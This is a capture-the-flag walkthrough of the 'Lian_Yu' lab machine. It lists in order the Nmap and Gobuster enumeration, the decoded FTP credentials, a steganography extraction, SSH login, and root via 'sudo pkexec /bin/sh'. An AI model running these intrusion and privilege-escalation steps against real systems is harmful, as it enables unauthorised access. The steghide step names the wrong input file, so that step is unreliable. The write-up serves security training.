# 🛡️ LAB 6 VA – LIAN YU (CTF Walkthrough)

A complete walkthrough of the **Lian_Yu vulnerable machine** using common penetration testing tools such as **Nmap, Gobuster, FTP, Steganography, and Privilege Escalation techniques**.

---

# 🔍 1. Reconnaissance (Nmap Scan)

```bash
nmap -sC -sV 10.48.145.56
```

* `-sC` → Default scripts
* `-sV` → Service version detection

This reveals open ports and running services.

---

# 🌐 2. Web Enumeration

Access target in browser:

```
http://10.48.145.56
```

---

# 📂 3. Directory Brute Force (Gobuster)

```bash
gobuster dir -u http://10.48.145.56 -w /usr/share/wordlists/dirb/common.txt
```

### 🔎 Result:

```
/island
```

---

# 🧠 4. Source Code Analysis

Navigate to:

```
http://10.48.145.56/island
```

* Inspect page source
* Found keyword:

```
vigilante
```

---

# 📂 5. Second Enumeration

```bash
gobuster dir -u http://10.48.145.56/island -w /usr/share/wordlists/dirb/common.txt
```

### 🔎 Result:

```
/2100
```

---

# 🔍 6. Hidden File Discovery

Navigate:

```
http://10.48.145.56/island/2100
```

* Inspect source
* Found hint:

```
.ticket
```

---

# 📂 7. Further Enumeration

```bash
gobuster dir -u http://10.48.145.56/island/2100 -w /usr/share/wordlists/dirb/common.txt
```

### 🔎 Result:

```
/green_arrow.ticket
```

---

# 🔐 8. Decode Credentials

Access:

```
http://10.48.145.56/island/2100/green_arrow.ticket
```

### Found:

```
RTy8yhBQdscX
```

Decode using CyberChef:

```
!#th3h00d
```

---

# 📡 9. FTP Access

```bash
ftp 10.48.145.56
```

### Credentials:

```
Username: vigilante
Password: !#th3h00d
```

---

# 📁 10. File Discovery (FTP)

```bash
ls
```

### Found:

```
aa.jpg
Queens_Gambit.png
Leave_me_alone.png
```

Download files:

```bash
lcd pictures
mget *
```

---

# 🧪 11. Metadata Analysis

```bash
exiftool aa.jpg
exiftool Queens_Gambit.png
exiftool Leave_me_alone.png
```

---

# ⚠️ 12. File Corruption Fix

* `Leave_me_alone.png` shows:

```
Wrong magic number
```

### Fix header using Python (example):

```python
with open("Leave_me_alone.png", "rb") as f:
    data = f.read()

with open("fixed.png", "wb") as f:
    f.write(b"\x89PNG\r\n\x1a\n" + data[8:])
```

---

# 🕵️ 13. Steganography Extraction

```bash
steghide extract -sf ss.zip
```

### Passphrase:

```
password
```

---

# 📦 14. Extract ZIP

```bash
unzip ss.zip
```

---

# 🔑 15. Credential Discovery

```bash
cat shadow
```

### Found:

```
M3tahuman
```

```bash
cat passwd.txt
```

### Login Credentials:

```
Username: slade
Password: M3tahuman
```

---

# 🔐 16. SSH Access

```bash
ssh slade@10.48.145.56
```

---

# ⚡ 17. Privilege Escalation

```bash
sudo -l
```

### Result:

User can run:

```
pkexec
```

---

# 🚀 18. Root Access

```bash
pkexec /bin/sh
```

Now you are root.

---

# 🏁 19. Capture Flag
<img width="897" height="401" alt="image" src="https://github.com/user-attachments/assets/479b8fb5-67e7-406d-99a4-283a282ff22f" />

```bash
ls
cat root.txt
```

---

# ✅ FINAL RESULT

🎉 Successfully completed the **Lian_Yu Room**!

---

# 🧠 Skills Learned

* Network Scanning (Nmap)
* Web Enumeration (Gobuster)
* Source Code Analysis
* FTP Exploitation
* Steganography (Steghide)
* File Repair (Magic Bytes)
* SSH Access
* Privilege Escalation (pkexec)

---

# ⚠️ Disclaimer

This walkthrough is for **educational purposes only**. Always perform penetration testing on systems you **own or have permission to test**.

---
